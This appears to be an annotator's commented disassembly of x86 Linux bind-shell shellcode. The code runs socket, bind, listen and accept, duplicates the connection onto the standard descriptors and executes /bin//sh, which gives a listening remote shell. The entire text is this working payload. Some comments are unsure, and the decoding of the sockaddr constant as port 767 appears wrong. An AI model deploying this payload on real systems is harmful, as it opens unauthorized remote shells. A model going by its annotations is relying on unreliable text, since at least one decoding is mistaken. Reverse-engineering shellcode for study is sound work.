######## socket(AF_INET, SOCK_STREAM, 0) ###########
xorl %ebx,%ebx #clear %ebx
mull %ebx #probably clear %eax and %edx
pushl %ebx #push a null dword
incl %ebx #ebx = 1
pushl %ebx #push the dword 0x00000001
pushl $0x2 #push the dword 0x00000002
movl %esp,%ecx #move current stack pointer to %ecx???
movb $0x66,%al #0x66 = 102 -> syscall  socketcall ??
int $0x80 #invoke syscall socketcall(1,[2,1,0]) which is socket(2, 1, 0)
## %eax holds socket
####### bind(sock, {
#bind(sock, *(0xd20402ff), 0x10) ( bind(sock, struct sockaddr *addr, size_t addrsize)
#demystifying 0xd20402ff:
# struct sockaddr_in {
#   sa_family_t sin_family; //2 bytes
#   in_port_t sin_port; //2 bytes
#   struct in_addr addr; //4 bytes, dummy struct, holds ipv4 addr
#   unsigned char padding[8] //8 bytes
# }
# so in here 0xd20402ff (and some trailing zeroes) encode the following struct:
# {0xd204, 0x02ff, 0x00000000, padding}
# which means: port == 767, addr == 0.0.0.0
popl %ebx #ebx = 2
popl %esi #esi = 1 (stack contains 0 on top)
pushl %edx # push null word
pushl $0xd20402ff #push random stuff
pushl $0x10 #push 0x00000010 = 16
pushl %ecx #%ecx is the old stack pointer after 3 pushs were made, 
pushl %eax
movl %esp,%ecx
pushl $0x66 #whoo, another socketcall
popl %eax
int $0x80 #socketcall(2, [sock, *(0xd20402ff), 0x10]
##listen
movl %eax,0x4(%ecx)
movb $0x4,%bl
movb $0x66,%al
int $0x80
##accept
incl %ebx
movb $0x66,%al
int $0x80
##ok, now what?
xchgl %eax,%ebx
popl %ecx
loc_00000032:
pushl $0x3f
popl %eax
int $0x80
decl %ecx
jns loc_00000032
pushl $0x68732f2f
pushl $0x6e69622f
movl %esp,%ebx
pushl %eax
pushl %ebx
movl %esp,%ecx
movb $0xb,%al
int $0x80
